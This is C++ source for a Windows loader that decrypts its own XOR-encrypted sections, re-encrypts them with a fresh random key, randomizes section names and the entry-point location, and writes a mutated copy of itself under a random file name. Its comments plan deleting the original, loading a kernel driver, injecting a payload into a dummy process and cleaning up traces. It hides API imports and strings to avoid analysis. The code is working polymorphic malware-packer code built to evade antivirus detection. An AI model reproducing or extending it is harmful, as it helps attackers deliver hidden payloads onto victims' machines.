#include <Windows.h>
#include <winternl.h>
#include <lazy_importer.hpp>
#include <xorstr.hpp>
#include "imports.h"
#include "bootstrap.h"

// #define DEBUG

#ifdef DEBUG
#define ERROR_MESSAGE(message) fnMessageBoxA(nullptr, xorstr_(message), xorstr_("Error"), MB_OK | MB_ICONERROR)
#else
#define ERROR_MESSAGE(message)
#endif

// plan of action:
// 1. get module base
// 2. decrypt all sections
// 3. create new executable
// 4. re-encrypt all sections in new executable
// 5. write new executable to disk
// 6. delete original executable
// 7. check if driver is loaded
// 8. if not, load driver
// 9. get driver version
// 10. if driver version is not supported, unload driver and load new driver
// 11. map the main loader and the payload into a dummy process
// 12. execute the main loader in the dummy process
// 13. cleanup traces
// 14. exit

// simple memcpy that can be inlined
__forceinline void inline_memcpy(PVOID dest, PVOID src, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        ((PBYTE)dest)[i] = ((PBYTE)src)[i];
    }
}

extern "C" int initial_loader(ULONG_PTR xorKey) {
    auto fnGetModuleHandleA = LI_FN(GetModuleHandleA).get();
    auto fnVirtualAlloc = LI_FN(VirtualAlloc).get();
    auto fnGetTickCount64 = LI_FN(GetTickCount64).get();
    auto fnRtlRandomEx = LI_FN(RtlRandomEx).get();
    auto fnCreateFileA = LI_FN(CreateFileA).get();
    auto fnWriteFile = LI_FN(WriteFile).get();
    auto fnCloseHandle = LI_FN(CloseHandle).get();
    auto fnExitProcess = LI_FN(ExitProcess).get();
#ifdef DEBUG
    // user32.dll is not loaded by default by windows, so we need to load it manually
    LI_FN(LoadLibraryA)(xorstr_("user32.dll"));
    auto fnMessageBoxA = LI_FN(MessageBoxA).get();
#else
    #define fnMessageBoxA(a, b, c, d)
#endif

    // get module base
    ULONG_PTR base = (ULONG_PTR)fnGetModuleHandleA(nullptr);

    // parse the headers
    auto nt_headers = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    auto section_header = IMAGE_FIRST_SECTION(nt_headers);

    // decrypt all sections
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];
        // only decrypt sections that start with 'e' (encrypted)
        if (section->Name[0] == 'e') {
            // decrypt section (8 bytes at a time)
            for (int j = 0; j < section->SizeOfRawData; j += sizeof(xorKey)) {
                auto data = (PULONG64)(base + section->VirtualAddress + j);
                *data ^= xorKey;
            }
        }
    }

    // allocate memory for new executable
    auto new_image_base = (ULONG_PTR)fnVirtualAlloc(nullptr, nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!new_image_base) {
        ERROR_MESSAGE("Failed to allocate memory for new executable");
        return 1;
    }

    // copy headers
    inline_memcpy((PVOID)new_image_base, (PVOID)base, nt_headers->OptionalHeader.SizeOfHeaders);
    nt_headers = (PIMAGE_NT_HEADERS)(new_image_base + ((PIMAGE_DOS_HEADER)new_image_base)->e_lfanew);
    section_header = IMAGE_FIRST_SECTION(nt_headers);

    // update image base in new executable to the current base the executable is loaded at
    nt_headers->OptionalHeader.ImageBase = base;

    // unmap sections
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];
        if (section->SizeOfRawData == 0) {
            continue;
        }
        inline_memcpy((PVOID)(new_image_base + section->PointerToRawData), (PVOID)(base + section->VirtualAddress), section->SizeOfRawData);
    }

    // generate a new random xor key
    ULONG seed = (ULONG)fnGetTickCount64();
    ULONG_PTR new_xor_key = (ULONG_PTR)fnRtlRandomEx(&seed) | ((ULONG_PTR)fnRtlRandomEx(&seed) << 32);

    // re-encrypt all sections in new executable
    section_header = IMAGE_FIRST_SECTION(nt_headers);
    PIMAGE_SECTION_HEADER loader_section = nullptr;
    PIMAGE_SECTION_HEADER bootstrap_section = nullptr;
    DWORD FileSize = 0;
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];
        switch (section->Name[0]) {
        case 'b': // bootstrap
            bootstrap_section = section;
            break;
        case 'l': // loader
            loader_section = section;
            // fallthrough (encrypt loader section too)
        case 'e': // encrypted
            // encrypt section
            for (int j = 0; j < section->SizeOfRawData; j += sizeof(new_xor_key)) {
                auto data = (PULONG64)(new_image_base + section->PointerToRawData + j);
                *data ^= new_xor_key;
            }
            break;
        }

        // calculate file size
        FileSize = max(FileSize, section->PointerToRawData + section->SizeOfRawData);
    }

    if (!loader_section) {
        ERROR_MESSAGE("Failed to find loader section");
        return 2;
    }

    if (!bootstrap_section) {
        ERROR_MESSAGE("Failed to find bootstrap section");
        return 3;
    }

    // fill bootstrap section with random data
    for (int i = 0; i < bootstrap_section->SizeOfRawData; i += sizeof(ULONG)) {
        auto data = (PULONG)(new_image_base + bootstrap_section->PointerToRawData + i);
        *data = fnRtlRandomEx(&seed);
    }

    // generate a new bootstrap section
    auto bootstrap_shellcode = get_bootstrap_shellcode(new_xor_key, loader_section->VirtualAddress, loader_section->SizeOfRawData);

    // pick a random offset in the bootstrap section to store the bootstrap shellcode
    ULONG_PTR max_offset = bootstrap_section->SizeOfRawData - bootstrap_shellcode.size();
    ULONG_PTR bootstrap_shellcode_offset = max_offset == 0 ? 0 : (fnRtlRandomEx(&seed) % max_offset);

    // copy bootstrap shellcode to new executable
    inline_memcpy((PVOID)(new_image_base + bootstrap_section->PointerToRawData + bootstrap_shellcode_offset), bootstrap_shellcode.data(), bootstrap_shellcode.size());

    // update entry point to point to bootstrap shellcode
    nt_headers->OptionalHeader.AddressOfEntryPoint = bootstrap_section->VirtualAddress + bootstrap_shellcode_offset;

    // randomize section names
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];
        // start at 1 to skip our "magic" section type indicator
        for (int j = 1; j < 8; j++) {
            section->Name[j] = (char)(fnRtlRandomEx(&seed) % 26 + 'a');
        }
    }

    // generate a random file name
    char file_name[MAX_PATH];
    for (int i = 0; i < 16; i++) {
        file_name[i] = (char)(fnRtlRandomEx(&seed) % 26 + 'a');
    }
    file_name[16] = '.';
    file_name[17] = 'e';
    file_name[18] = 'x';
    file_name[19] = 'e';
    file_name[20] = '\0';

    // open file for the new executable
    auto file_handle = fnCreateFileA(file_name, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file_handle == INVALID_HANDLE_VALUE) {
        ERROR_MESSAGE("Failed to open file for new executable");
        return 4;
    }

    // write new executable to disk
    DWORD bytes_written = 0;
    if (!fnWriteFile(file_handle, (PVOID)new_image_base, FileSize, &bytes_written, nullptr)) {
        ERROR_MESSAGE("Failed to write new executable to disk");
        return 5;
    }

    // close file handle
    fnCloseHandle(file_handle);

    if (bytes_written != FileSize) {
        ERROR_MESSAGE("Failed to write entire new executable to disk");
        return 6;
    }

    // display message box
    fnMessageBoxA(nullptr, xorstr_("WORKS!"), xorstr_("WORKS"), MB_OK | MB_ICONINFORMATION);

    fnExitProcess(0);
    return 0;
}